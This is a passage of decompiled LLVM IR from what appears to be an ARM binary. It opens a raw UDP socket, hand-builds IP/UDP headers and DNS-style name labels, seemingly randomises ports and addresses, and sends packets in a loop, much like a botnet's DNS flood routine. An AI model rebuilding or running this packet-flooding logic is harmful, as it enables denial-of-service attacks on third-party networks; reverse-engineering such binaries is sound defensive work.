  %stack_var_-2172.0 = phi i32 [ %v1_da88, %dec_label_pc_da7c ], [ %v1_daa0, %dec_label_pc_da94 ], [ %v1_dab0, %dec_label_pc_daac ], [ %v1_dac8, %dec_label_pc_dabc ], [ %v1_d674, %dec_label_pc_d644 ]
  store i32 %v6_d54c, i32* %r2.global-to-local, align 4
  %v2_d680 = icmp eq i32 %v6_d54c, 0
  store i1 %v2_d680, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d680, label %dec_label_pc_da6c, label %dec_label_pc_d688

dec_label_pc_d688:                                ; preds = %dec_label_pc_d67c
  store i32 %v6_d54c, i32* %r0.global-to-local, align 4
  %v1_d68c = inttoptr i32 %v6_d54c to i8*
  %v2_d68c = call i32 @function_12324(i8* %v1_d68c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_d68c, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_d6a0 = call i32 @function_14b54(i32 2, i32 3, i32 17)
  store i32 %v3_d6a0, i32* @r0, align 4
  %v7_d6a4 = icmp eq i32 %v3_d6a0, -1
  store i1 %v7_d6a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d6a4, label %dec_label_pc_da6c, label %dec_label_pc_d6b0

dec_label_pc_d6b0:                                ; preds = %dec_label_pc_d688
  store i32 1, i32* %stack_var_-44, align 4
  %v6_d6b8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_d6b8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v5_d6cc = call i32 @function_14ae4(i32 %v3_d6a0, i32 0, i32 3, i32 %v6_d6b8, i32 4)
  store i32 %v5_d6cc, i32* %r0.global-to-local, align 4
  %v7_d6d0 = icmp eq i32 %v5_d6cc, -1
  store i1 %v7_d6d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d6d0, label %dec_label_pc_da64, label %dec_label_pc_d6d8

dec_label_pc_d6d8:                                ; preds = %dec_label_pc_d6b0
  %v0_d6e4 = load i32, i32* @sb, align 4
  %v0_d6ec = load i32, i32* @fp, align 4
  store i32 0, i32* @ip, align 4
  %v3_d6f4 = urem i32 %v7_d48c, 65536
  store i32 %v3_d6f4, i32* %r3.global-to-local, align 4
  %v3_d6f8 = urem i32 %v6_d4e8, 65536
  store i32 %v3_d6f8, i32* %r2.global-to-local, align 4
  %v3_d6fc = urem i32 %v0_d6ec, 65536
  store i32 %v3_d6fc, i32* %r1.global-to-local, align 4
  %v3_d700 = urem i32 %v0_d6e4, 65536
  store i32 %v3_d700, i32* %r0.global-to-local, align 4
  %v0_d704 = load i32, i32* @r8, align 4
  %v2_d704 = icmp eq i32 %v0_d704, 0
  store i1 %v2_d704, i1* %cpsr_z.global-to-local, align 1
  %v0_d718 = load i32, i32* @sl, align 4
  %v1_d718 = urem i32 %v0_d718, 256
  store i32 %v1_d718, i32* @fp, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d704, label %dec_label_pc_d8c8, label %dec_label_pc_d724

dec_label_pc_d724:                                ; preds = %dec_label_pc_d6d8
  %v0_d724 = load i32, i32* @r6, align 4
  %v2_d724 = add i32 %v0_d724, %v1_d718
  %v3_d728 = mul i32 %v2_d724, 65536
  %v1_d72c = add i32 %v3_d728, 1769472
  %v3_d730 = udiv i32 %v1_d72c, 65536
  store i32 %v3_d730, i32* @sl, align 4
  %v1_d734 = add i32 %v0_d724, 1
  store i32 %v1_d734, i32* %r2.global-to-local, align 4
  %v1_d738 = add i32 %v3_d728, 3080192
  store i32 %v1_d738, i32* %r3.global-to-local, align 4
  %v3_d740 = udiv i32 %v1_d738, 65536
  store i32 %v3_d740, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v4_d788 = sext i8 %v5_d488 to i32
  %v2_d7ac = icmp eq i32 %v1_d4d0, 0
  %sext = mul i32 %v6_d4a4, 16777216
  %v3_d7a8 = sdiv i32 %sext, 16777216
  br label %dec_label_pc_d748

dec_label_pc_d748:                                ; preds = %dec_label_pc_d890, %dec_label_pc_d724
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_d750 = call i32 @function_1320c(i32 600, i32 1)
  store i32 %v2_d750, i32* %r0.global-to-local, align 4
  store i32 %v2_d450, i32* %r1.global-to-local, align 4
  %v2_d75c = load i32, i32* @r5, align 4
  %v5_d75c = mul i32 %v2_d75c, 4
  %v6_d75c = add i32 %v5_d75c, %v2_d450
  %v7_d75c = inttoptr i32 %v6_d75c to i32*
  store i32 %v2_d750, i32* %v7_d75c, align 4
  %v3_d760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d760, i32* %r3.global-to-local, align 4
  %v0_d764 = load i32, i32* %r1.global-to-local, align 4
  %v4_d764 = mul i32 %v3_d760, 4
  %v5_d764 = add i32 %v0_d764, %v4_d764
  %v6_d764 = inttoptr i32 %v5_d764 to i32*
  %v7_d764 = load i32, i32* %v6_d764, align 4
  store i32 %v7_d764, i32* %r5.global-to-local, align 4
  %v1_d768 = inttoptr i32 %v7_d764 to i8*
  %v2_d768 = load i8, i8* %v1_d768, align 1
  %tmp94 = urem i8 %v2_d768, 16
  %v1_d76c = zext i8 %tmp94 to i32
  %v1_d770 = or i32 %v1_d76c, 64
  store i32 %v1_d770, i32* %r2.global-to-local, align 4
  %v1_d774 = trunc i32 %v1_d770 to i8
  store i8 %v1_d774, i8* %v1_d768, align 1
  %v0_d778 = load i32, i32* %r5.global-to-local, align 4
  %v1_d778 = inttoptr i32 %v0_d778 to i8*
  %v2_d778 = load i8, i8* %v1_d778, align 1
  %v3_d778 = zext i8 %v2_d778 to i32
  %v1_d77c = and i32 %v3_d778, 240
  %v1_d780 = or i32 %v1_d77c, 5
  store i32 %v1_d780, i32* %r3.global-to-local, align 4
  %v1_d784 = trunc i32 %v1_d780 to i8
  store i8 %v1_d784, i8* %v1_d778, align 1
  store i32 %v4_d788, i32* %r2.global-to-local, align 4
  %v0_d78c = load i32, i32* @sb, align 4
  store i32 %v0_d78c, i32* %r0.global-to-local, align 4
  %v2_d790 = load i32, i32* %r5.global-to-local, align 4
  %v3_d790 = add i32 %v2_d790, 1
  %v4_d790 = inttoptr i32 %v3_d790 to i8*
  store i8 %v5_d488, i8* %v4_d790, align 1
  %v1_d794 = call i32 @function_1484c(i32 %v0_d78c)
  %v2_d794 = trunc i32 %v1_d794 to i16
  %v3_d798 = load i32, i32* %r5.global-to-local, align 4
  %v4_d798 = add i32 %v3_d798, 2
  %v5_d798 = inttoptr i32 %v4_d798 to i16*
  store i16 %v2_d794, i16* %v5_d798, align 2
  store i32 %v3_d6f4, i32* %r0.global-to-local, align 4
  %v1_d7a0 = call i32 @function_1484c(i32 %v3_d6f4)
  %v2_d7a0 = trunc i32 %v1_d7a0 to i16
  store i32 %v1_d7a0, i32* %r0.global-to-local, align 4
  store i32 %v3_d7a8, i32* %r1.global-to-local, align 4
  store i32 %v1_d4d0, i32* %r3.global-to-local, align 4
  store i1 %v2_d7ac, i1* %cpsr_z.global-to-local, align 1
  %v3_d7b0 = load i32, i32* %r5.global-to-local, align 4
  %v4_d7b0 = add i32 %v3_d7b0, 4
  %v5_d7b0 = inttoptr i32 %v4_d7b0 to i16*
  store i16 %v2_d7a0, i16* %v5_d7b0, align 2
  %v0_d7b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_d7b4 = trunc i32 %v0_d7b4 to i8
  %v2_d7b4 = load i32, i32* %r5.global-to-local, align 4
  %v3_d7b4 = add i32 %v2_d7b4, 8
  %v4_d7b4 = inttoptr i32 %v3_d7b4 to i8*
  store i8 %v1_d7b4, i8* %v4_d7b4, align 1
  %v0_d7b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_d7b8 = add i32 %v0_d7b8, 20
  store i32 %v1_d7b8, i32* %r4.global-to-local, align 4
  %v1_d7bc = add i32 %v0_d7b8, 28
  store i32 %v1_d7bc, i32* @r7, align 4
  %v0_d7c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d7c0, label %dec_label_pc_d7c4, label %dec_label_pc_da54

dec_label_pc_d7c4:                                ; preds = %dec_label_pc_d748, %dec_label_pc_da54
  %v2_d7c8 = phi i32 [ %v0_d7b8, %dec_label_pc_d748 ], [ %v2_d7c8.pre, %dec_label_pc_da54 ]
  %v3_d7c8 = add i32 %v2_d7c8, 9
  %v4_d7c8 = inttoptr i32 %v3_d7c8 to i8*
  store i8 17, i8* %v4_d7c8, align 1
  store i32 ptrtoint (i32* @global_var_2290c.90 to i32), i32* %r3.global-to-local, align 4
  store i32 %stack_var_-2172.0, i32* %r1.global-to-local, align 4
  %v2_d7d4 = load i32, i32* @global_var_2290c.90, align 4
  store i32 %v2_d7d4, i32* %r2.global-to-local, align 4
  store i32 %v3_d6f8, i32* %r0.global-to-local, align 4
  %v1_d7dc = load i32, i32* %r5.global-to-local, align 4
  %v2_d7dc = add i32 %v1_d7dc, 12
  %v3_d7dc = inttoptr i32 %v2_d7dc to i32*
  store i32 %v2_d7d4, i32* %v3_d7dc, align 4
  %v0_d7e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_d7e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_d7e0 = add i32 %v1_d7e0, 16
  %v3_d7e0 = inttoptr i32 %v2_d7e0 to i32*
  store i32 %v0_d7e0, i32* %v3_d7e0, align 4
  %v1_d7e4 = call i32 @function_1484c(i32 %v3_d6f8)
  %v2_d7e4 = trunc i32 %v1_d7e4 to i16
  %v3_d7e8 = load i32, i32* %r5.global-to-local, align 4
  %v4_d7e8 = add i32 %v3_d7e8, 20
  %v5_d7e8 = inttoptr i32 %v4_d7e8 to i16*
  store i16 %v2_d7e4, i16* %v5_d7e8, align 2
  store i32 %v3_d6fc, i32* %r0.global-to-local, align 4
  %v1_d7f0 = call i32 @function_1484c(i32 %v3_d6fc)
  %v2_d7f0 = trunc i32 %v1_d7f0 to i16
  %v3_d7f4 = load i32, i32* %r4.global-to-local, align 4
  %v4_d7f4 = add i32 %v3_d7f4, 2
  %v5_d7f4 = inttoptr i32 %v4_d7f4 to i16*
  store i16 %v2_d7f0, i16* %v5_d7f4, align 2
  %v0_d7f8 = load i32, i32* @sl, align 4
  store i32 %v0_d7f8, i32* %r0.global-to-local, align 4
  %v1_d7fc = call i32 @function_1484c(i32 %v0_d7f8)
  %v2_d7fc = trunc i32 %v1_d7fc to i16
  %v3_d800 = load i32, i32* %r4.global-to-local, align 4
  %v4_d800 = add i32 %v3_d800, 4
  %v5_d800 = inttoptr i32 %v4_d800 to i16*
  store i16 %v2_d7fc, i16* %v5_d800, align 2
  store i32 %v3_d700, i32* %r0.global-to-local, align 4
  %v1_d808 = call i32 @function_1484c(i32 %v3_d700)
  %v2_d808 = trunc i32 %v1_d808 to i16
  %v3_d80c = load i32, i32* %r5.global-to-local, align 4
  %v4_d80c = add i32 %v3_d80c, 28
  %v5_d80c = inttoptr i32 %v4_d80c to i16*
  store i16 %v2_d808, i16* %v5_d80c, align 2
  store i32 256, i32* %r0.global-to-local, align 4
  %v1_d814 = call i32 @function_1484c(i32 256)
  %v2_d814 = trunc i32 %v1_d814 to i16
  %v3_d818 = load i32, i32* @r7, align 4
  %v4_d818 = add i32 %v3_d818, 2
  %v5_d818 = inttoptr i32 %v4_d818 to i16*
  store i16 %v2_d814, i16* %v5_d818, align 2
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_d820 = call i32 @function_1484c(i32 1)
  %v2_d820 = trunc i32 %v1_d820 to i16
  %v0_d824 = load i32, i32* %r5.global-to-local, align 4
  %v1_d824 = add i32 %v0_d824, 41
  store i32 %v1_d824, i32* %r3.global-to-local, align 4
  %v1_d828 = load i32, i32* @fp, align 4
  %v2_d828 = add i32 %v1_d828, %v1_d824
  store i32 %v2_d828, i32* %r4.global-to-local, align 4
  %v3_d82c = load i32, i32* @r7, align 4
  %v4_d82c = add i32 %v3_d82c, 4
  %v5_d82c = inttoptr i32 %v4_d82c to i16*
  store i16 %v2_d820, i16* %v5_d82c, align 2
  %v0_d830 = load i32, i32* @fp, align 4
  %v1_d830 = trunc i32 %v0_d830 to i8
  %v2_d830 = load i32, i32* %r5.global-to-local, align 4
  %v3_d830 = add i32 %v2_d830, 40
  %v4_d830 = inttoptr i32 %v3_d830 to i8*
  store i8 %v1_d830, i8* %v4_d830, align 1
  %v0_d834 = load i32, i32* %r4.global-to-local, align 4
  %v1_d834 = add i32 %v0_d834, 1
  store i32 %v1_d834, i32* %r0.global-to-local, align 4
  store i32 %v6_d54c, i32* %r1.global-to-local, align 4
  store i32 %v1_d734, i32* %r2.global-to-local, align 4
  %v3_d840 = call i32 @function_12394(i32 %v1_d834, i32 %v6_d54c, i32 %v1_d734)
  store i32 %v3_d840, i32* %r0.global-to-local, align 4
  %v0_d844 = load i32, i32* @r6, align 4
  %v2_d844 = icmp eq i32 %v0_d844, 0
  store i1 %v2_d844, i1* %cpsr_z.global-to-local, align 1
  %tmp80 = icmp slt i32 %v0_d844, 1
  br i1 %tmp80, label %bb81, label %dec_label_pc_d854

bb81:                                             ; preds = %dec_label_pc_d7c4
  %v5_d848 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_d848, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_d890

dec_label_pc_d854:                                ; preds = %dec_label_pc_d7c4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_d858 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d858, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d860

dec_label_pc_d860:                                ; preds = %.thread10, %dec_label_pc_d854
  %v0_d870 = phi i32 [ %storemerge, %.thread10 ], [ 0, %dec_label_pc_d854 ]
  %v0_d874 = phi i32 [ %v0_d888, %.thread10 ], [ 0, %dec_label_pc_d854 ]
  store i32 %v6_d54c, i32* %r2.global-to-local, align 4
  %v2_d864 = add i32 %v0_d874, %v6_d54c
  %v3_d864 = inttoptr i32 %v2_d864 to i8*
  %v4_d864 = load i8, i8* %v3_d864, align 1
  %v6_d864 = zext i8 %v4_d864 to i32
  store i32 %v6_d864, i32* %r3.global-to-local, align 4
  %v7_d868 = icmp eq i8 %v4_d864, 46
  store i1 %v7_d868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d868, label %bb82, label %.thread45

.thread45:                                        ; preds = %dec_label_pc_d860
  %v1_d8706 = add nsw i32 %v0_d870, 1
  store i32 %v1_d8706, i32* %r2.global-to-local, align 4
  %v1_d8748 = add i32 %v0_d874, 1
  store i32 %v1_d8748, i32* %r1.global-to-local, align 4
  br label %bb83

bb82:                                             ; preds = %dec_label_pc_d860
  %v1_d86c = load i32, i32* %r4.global-to-local, align 4
  %v3_d86c = add i32 %v1_d86c, %v0_d874
  store i32 %v3_d86c, i32* %r3.global-to-local, align 4
  %v1_d870 = add nsw i32 %v0_d870, 1
  store i32 %v1_d870, i32* %r2.global-to-local, align 4
  %v1_d874 = add i32 %v0_d874, 1
  store i32 %v1_d874, i32* %r1.global-to-local, align 4
  %v2_d878 = trunc i32 %v0_d870 to i8
  %v3_d878 = load i32, i32* %r0.global-to-local, align 4
  %v4_d878 = inttoptr i32 %v3_d878 to i8*
  store i8 %v2_d878, i8* %v4_d878, align 1
  %v0_d87c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d87c.pre, label %bb84, label %bb82.bb83_crit_edge

bb82.bb83_crit_edge:                              ; preds = %bb82
  %v1_d87c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb83

bb83:                                             ; preds = %bb82.bb83_crit_edge, %.thread45
  %v1_d87c = phi i32 [ %v1_d87c.pre, %bb82.bb83_crit_edge ], [ %v1_d8706, %.thread45 ]
  %v2_d87c = urem i32 %v1_d87c, 256
  br label %.thread10

bb84:                                             ; preds = %bb82
  %v1_d880 = load i32, i32* %r3.global-to-local, align 4
  %v2_d880 = add i32 %v1_d880, 1
  store i32 %v2_d880, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %bb83, %bb84
  %storemerge = phi i32 [ %v2_d87c, %bb83 ], [ 0, %bb84 ]
  store i32 %storemerge, i32* @ip, align 4
  %v0_d888 = load i32, i32* %r1.global-to-local, align 4
  %v1_d888 = load i32, i32* @r6, align 4
  %v9_d888 = icmp eq i32 %v0_d888, %v1_d888
  store i1 %v9_d888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d888, label %dec_label_pc_d890.loopexit, label %dec_label_pc_d860

dec_label_pc_d890.loopexit:                       ; preds = %.thread10
  %v2_d890.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t = trunc i32 %storemerge to i8
  br label %dec_label_pc_d890

dec_label_pc_d890:                                ; preds = %bb81, %dec_label_pc_d890.loopexit
  %v0_d890.off0 = phi i8 [ %extract.t, %dec_label_pc_d890.loopexit ], [ 0, %bb81 ]
  %v2_d890 = phi i32 [ %v2_d890.pre, %dec_label_pc_d890.loopexit ], [ %v5_d848, %bb81 ]
  %v3_d890 = inttoptr i32 %v2_d890 to i8*
  store i8 %v0_d890.off0, i8* %v3_d890, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_d898 = call i32 @function_1484c(i32 1)
  %v2_d898 = trunc i32 %v1_d898 to i16
  %v0_d89c = load i32, i32* %r4.global-to-local, align 4
  %v1_d89c = load i32, i32* @r6, align 4
  %v2_d89c = add i32 %v1_d89c, %v0_d89c
  store i32 %v2_d89c, i32* %r4.global-to-local, align 4
  %v4_d8a0 = add i32 %v2_d89c, 2
  %v5_d8a0 = inttoptr i32 %v4_d8a0 to i16*
  store i16 %v2_d898, i16* %v5_d8a0, align 2
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_d8a8 = call i32 @function_1484c(i32 1)
  %v2_d8a8 = trunc i32 %v1_d8a8 to i16
  store i32 %v1_d8a8, i32* %r0.global-to-local, align 4
  %v3_d8ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d8ac, i32* %r3.global-to-local, align 4
  %v1_d8b0 = add i32 %v3_d8ac, 1
  store i32 %v1_d8b0, i32* @r5, align 4
  %v0_d8b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_d8b4 = add i32 %v0_d8b4, 2
  store i32 %v1_d8b4, i32* @r4, align 4
  %v1_d8b8 = load i32, i32* @r8, align 4
  %v9_d8b8 = icmp eq i32 %v1_d8b0, %v1_d8b8
  store i1 %v9_d8b8, i1* %cpsr_z.global-to-local, align 1
  %v4_d8bc = add i32 %v0_d8b4, 4
  %v5_d8bc = inttoptr i32 %v4_d8bc to i16*
  store i16 %v2_d8a8, i16* %v5_d8bc, align 2
  %v0_d8c0 = load i32, i32* @r5, align 4
  store i32 %v0_d8c0, i32* %stack_var_-44, align 4
  %v5_d8c4 = icmp slt i32 %v1_d8b0, %v1_d8b8
  br i1 %v5_d8c4, label %dec_label_pc_d748, label %dec_label_pc_d8c8.loopexit

dec_label_pc_d8c8.loopexit:                       ; preds = %dec_label_pc_d890
  %v1_d8c8.pre = load i32, i32* @fp, align 4
  %v0_d8d0.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_d8c8

dec_label_pc_d8c8:                                ; preds = %dec_label_pc_d8c8.loopexit, %dec_label_pc_d6d8
  %v0_d8d0.pre = phi i32 [ %v0_d8d0.pre.pre, %dec_label_pc_d8c8.loopexit ], [ 0, %dec_label_pc_d6d8 ]
  %v1_d8c8 = phi i32 [ %v1_d8c8.pre, %dec_label_pc_d8c8.loopexit ], [ %v1_d718, %dec_label_pc_d6d8 ]
  %v0_d8c8 = load i32, i32* @r6, align 4
  %v2_d8c8 = add i32 %v0_d8c8, %v1_d8c8
  store i32 %v2_d8c8, i32* @r7, align 4
  %v6_d8ec = inttoptr i32 %v2_d450 to i32*
  %v3_d8f4 = icmp eq i32 %v3_d6f4, 65535
  %v3_d90c = icmp eq i32 %v3_d6f8, 65535
  br label %dec_label_pc_d8cc

dec_label_pc_d8cc:                                ; preds = %dec_label_pc_d92c, %dec_label_pc_d8cc, %dec_label_pc_d8c8
  %v0_d8d0 = phi i32 [ %v0_d8d0.pre, %dec_label_pc_d8c8 ], [ 0, %dec_label_pc_d8cc ], [ %v1_d9bc, %dec_label_pc_d92c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d8d0 = icmp eq i32 %v0_d8d0, 0
  store i1 %v2_d8d0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d8d0, label %dec_label_pc_d8cc, label %dec_label_pc_d8dc

dec_label_pc_d8dc:                                ; preds = %dec_label_pc_d8cc
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_d450, i32* %r3.global-to-local, align 4
  store i32 65536, i32* %r5.global-to-local, align 4
  store i32 %v3_d6f4, i32* %r1.global-to-local, align 4
  %v7_d8ec = load i32, i32* %v6_d8ec, align 4
  store i32 %v7_d8ec, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_d8f4, i1* %cpsr_z.global-to-local, align 1
  %v0_d8f8 = load i32, i32* @r7, align 4
  %v1_d8f8 = add i32 %v0_d8f8, 27
  store i32 %v1_d8f8, i32* @sb, align 4
  %v1_d8fc = add i32 %v0_d8f8, 47
  store i32 %v1_d8fc, i32* @sl, align 4
  %v1_d900 = add i32 %v7_d8ec, 20
  store i32 %v1_d900, i32* @r6, align 4
  br i1 %v3_d8f4, label %dec_label_pc_d9e8, label %dec_label_pc_d908

dec_label_pc_d908:                                ; preds = %dec_label_pc_d9c8, %dec_label_pc_d8dc
  store i32 %v3_d6f8, i32* %r2.global-to-local, align 4
  store i1 %v3_d90c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d90c, label %dec_label_pc_d9fc, label %dec_label_pc_d914

dec_label_pc_d914:                                ; preds = %dec_label_pc_d9e8.dec_label_pc_d914_crit_edge, %dec_label_pc_d908
  %v1_d918 = phi i32 [ %v1_d918.pre, %dec_label_pc_d9e8.dec_label_pc_d914_crit_edge ], [ 65535, %dec_label_pc_d908 ]
  store i32 %v3_d6fc, i32* @r3, align 4
  %v9_d918 = icmp eq i32 %v3_d6fc, %v1_d918
  store i1 %v9_d918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d918, label %dec_label_pc_da10, label %dec_label_pc_d920

dec_label_pc_d920:                                ; preds = %dec_label_pc_d9fc.dec_label_pc_d920_crit_edge, %dec_label_pc_d914
  %v1_d924 = phi i32 [ %v1_d924.pre, %dec_label_pc_d9fc.dec_label_pc_d920_crit_edge ], [ %v1_d918, %dec_label_pc_d914 ]
  store i32 %v3_d700, i32* %r1.global-to-local, align 4
  %v9_d924 = icmp eq i32 %v3_d700, %v1_d924
  store i1 %v9_d924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d924, label %dec_label_pc_da24, label %dec_label_pc_d92c

dec_label_pc_d92c:                                ; preds = %dec_label_pc_da10, %dec_label_pc_d920, %dec_label_pc_da24
  %v0_d92c = load i32, i32* @r4, align 4
  %v1_d92c = add i32 %v0_d92c, 41
  store i32 %v1_d92c, i32* %r0.global-to-local, align 4
  %v0_d930 = load i32, i32* @fp, align 4
  store i32 %v0_d930, i32* %r1.global-to-local, align 4
  %v2_d934 = inttoptr i32 %v1_d92c to i8*
  %v3_d934 = call i32 @function_f634(i8* %v2_d934, i32 %v0_d930)
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d93c = load i32, i32* @r4, align 4
  %v3_d93c = add i32 %v2_d93c, 10
  %v4_d93c = inttoptr i32 %v3_d93c to i16*
  store i16 0, i16* %v4_d93c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_d944 = load i32, i32* @r4, align 4
  store i32 %v0_d944, i32* @r0, align 4
  %v2_d948 = call i32 @function_dadc(i32 %v0_d944, i32 20)
  %v3_d948 = trunc i32 %v2_d948 to i16
  store i32 %v2_d948, i32* %r0.global-to-local, align 4
  %v3_d94c = load i32, i32* @r4, align 4
  %v4_d94c = add i32 %v3_d94c, 10
  %v5_d94c = inttoptr i32 %v4_d94c to i16*
  store i16 %v3_d948, i16* %v5_d94c, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d954 = load i32, i32* @r6, align 4
  %v3_d954 = add i32 %v2_d954, 6
  %v4_d954 = inttoptr i32 %v3_d954 to i16*
  store i16 0, i16* %v4_d954, align 2
  %v0_d958 = load i32, i32* @r6, align 4
  store i32 %v0_d958, i32* @r1, align 4
  %v1_d95c = add i32 %v0_d958, 4
  %v2_d95c = inttoptr i32 %v1_d95c to i16*
  %v3_d95c = load i16, i16* %v2_d95c, align 2
  %v4_d95c = zext i16 %v3_d95c to i32
  store i32 %v4_d95c, i32* %r2.global-to-local, align 4
  %v0_d960 = load i32, i32* @sb, align 4
  store i32 %v0_d960, i32* %r3.global-to-local, align 4
  %v0_d964 = load i32, i32* @r4, align 4
  store i32 %v0_d964, i32* %r0.global-to-local, align 4
  %v4_d968 = call i32 @function_db2c(i32 %v0_d964, i32 %v0_d958, i32 %v4_d95c, i32 %v0_d960)
  %v5_d968 = trunc i32 %v4_d968 to i16
  store i32 %v4_d968, i32* %r0.global-to-local, align 4
  %v3_d96c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d96c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v3_d974 = mul i32 %v3_d96c, 32
  store i32 %v3_d974, i32* %ip.global-to-local, align 4
  %v3_d978 = load i32, i32* @r6, align 4
  %v4_d978 = add i32 %v3_d978, 6
  %v5_d978 = inttoptr i32 %v4_d978 to i16*
  store i16 %v5_d968, i16* %v5_d978, align 2
  store i32 %stack_var_-2172.0, i32* %r2.global-to-local, align 4
  %v0_d980 = load i32, i32* @r6, align 4
  %v1_d980 = add i32 %v0_d980, 2
  %v2_d980 = inttoptr i32 %v1_d980 to i16*
  %v3_d980 = load i16, i16* %v2_d980, align 2
  %v4_d980 = zext i16 %v3_d980 to i32
  store i32 %v4_d980, i32* %r6.global-to-local, align 4
  %v0_d984 = load i32, i32* %ip.global-to-local, align 4
  %v1_d984 = load i32, i32* %r3.global-to-local, align 4
  %tmp95 = mul i32 %v1_d984, -8
  %v5_d984 = add i32 %v0_d984, %tmp95
  %v1_d988 = load i32, i32* %r1.global-to-local, align 4
  %v2_d988 = add i32 %v1_d988, %v5_d984
  store i32 %v2_d988, i32* %ip.global-to-local, align 4
  %v2_d98c = add i32 %v2_d988, 4
  %v3_d98c = inttoptr i32 %v2_d98c to i32*
  store i32 %stack_var_-2172.0, i32* %v3_d98c, align 4
  %v0_d990 = load i32, i32* %r6.global-to-local, align 4
  %v1_d990 = trunc i32 %v0_d990 to i16
  %v2_d990 = load i32, i32* %ip.global-to-local, align 4
  %v3_d990 = add i32 %v2_d990, 2
  %v4_d990 = inttoptr i32 %v3_d990 to i16*
  store i16 %v1_d990, i16* %v4_d990, align 2
  %v0_d994 = load i32, i32* @r4, align 4
  store i32 %v0_d994, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_d6a0, i32* @r0, align 4
  %v0_d9a0 = load i32, i32* @sl, align 4
  store i32 %v0_d9a0, i32* @r2, align 4
  store i32 16, i32* @r4, align 4
  %v0_d9b0 = call i32 @function_14a98()
  %v3_d9b4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d9b4, i32* %r3.global-to-local, align 4
  %v1_d9b8 = add i32 %v3_d9b4, 1
  store i32 %v1_d9b8, i32* %r0.global-to-local, align 4
  %v1_d9bc = load i32, i32* @r8, align 4
  %v9_d9bc = icmp eq i32 %v1_d9b8, %v1_d9bc
  store i1 %v9_d9bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d9b8, i32* %stack_var_-44, align 4
  %v6_d9c4 = icmp slt i32 %v1_d9b8, %v1_d9bc
  br i1 %v6_d9c4, label %dec_label_pc_d9c8, label %dec_label_pc_d8cc

dec_label_pc_d9c8:                                ; preds = %dec_label_pc_d92c
  store i32 %v2_d450, i32* %r3.global-to-local, align 4
  store i32 65536, i32* %r5.global-to-local, align 4
  store i32 %v3_d6f4, i32* %r1.global-to-local, align 4
  %v4_d9d4 = mul i32 %v1_d9b8, 4
  %v5_d9d4 = add i32 %v4_d9d4, %v2_d450
  %v6_d9d4 = inttoptr i32 %v5_d9d4 to i32*
  %v7_d9d4 = load i32, i32* %v6_d9d4, align 4
  store i32 %v7_d9d4, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_d8f4, i1* %cpsr_z.global-to-local, align 1
  %v1_d9e0 = add i32 %v7_d9d4, 20
  store i32 %v1_d9e0, i32* @r6, align 4
  br i1 %v3_d8f4, label %dec_label_pc_d9e8, label %dec_label_pc_d908

dec_label_pc_d9e8:                                ; preds = %dec_label_pc_d9c8, %dec_label_pc_d8dc
  %v0_d9e8 = call i32 @function_f570()
  %v1_d9e8 = trunc i32 %v0_d9e8 to i16
  store i32 %v0_d9e8, i32* %r0.global-to-local, align 4
  store i32 %v3_d6f8, i32* %r2.global-to-local, align 4
  %v1_d9f0 = load i32, i32* @r5, align 4
  %v9_d9f0 = icmp eq i32 %v3_d6f8, %v1_d9f0
  store i1 %v9_d9f0, i1* %cpsr_z.global-to-local, align 1
  %v3_d9f4 = load i32, i32* @r4, align 4
  %v4_d9f4 = add i32 %v3_d9f4, 4
  %v5_d9f4 = inttoptr i32 %v4_d9f4 to i16*
